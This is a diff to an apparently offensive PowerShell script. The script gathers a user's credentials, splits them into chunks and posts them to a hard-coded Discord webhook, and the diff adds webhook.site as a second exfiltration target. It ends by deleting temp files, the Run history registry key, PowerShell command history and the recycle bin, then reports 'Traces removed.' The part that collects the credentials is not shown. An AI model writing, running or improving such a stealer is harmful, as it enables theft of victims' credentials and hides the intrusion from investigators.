@@ -1,11 +1,13 @@
 $DiscordWebhookURL = "https://discord.com/api/webhooks/1358155811704017077/FjjsaYnvKE_FDDC7QDe0N2jl6X0RsKwPyjcbDhEaHcXst--8AJJlZ3TrbMRuRmhV_wfL"
+$WebhookSiteURL = "https://webhook.site/5d7a2b24-5f97-4bfc-80bd-e79bc5233c89"
+
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
-function Send-MessageToDiscord {
+function Send-MessageToWebhooks {
     param (
         [string]$Message
     )
-    
+
     $body = @{
         content = $Message
     } | ConvertTo-Json
@@ -14,10 +16,18 @@ function Send-MessageToDiscord {
         "Content-Type" = "application/json"
     }
 
+    # Attempt to send to Discord Webhook
     try {
         Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Body $body -Headers $headers | Out-Null
     } catch {
-        Out-Null
+        Write-Host "Error sending message to Discord webhook: $_"
+    }
+
+    # Fallback to Webhook.site if Discord fails
+    try {
+        Invoke-RestMethod -Uri $WebhookSiteURL -Method Post -Body $body -Headers $headers | Out-Null
+    } catch {
+        Write-Host "Error sending message to Webhook.site: $_"
     }
 }
 
@@ -61,16 +71,16 @@ while ($allCredentialsMessage.Length -gt $maxLength) {
 $chunks.Add($allCredentialsMessage)
 
 foreach ($chunk in $chunks) {
-    Send-MessageToDiscord $chunk
+    Send-MessageToWebhooks $chunk
     Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 2)
 }
 
-Send-MessageToDiscord "Chrome restarted successfully."
+Send-MessageToWebhooks "Chrome restarted successfully."
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
-Send-MessageToDiscord "Cleanup completed. Traces removed."
+Send-MessageToWebhooks "Cleanup completed. Traces removed."
 exit
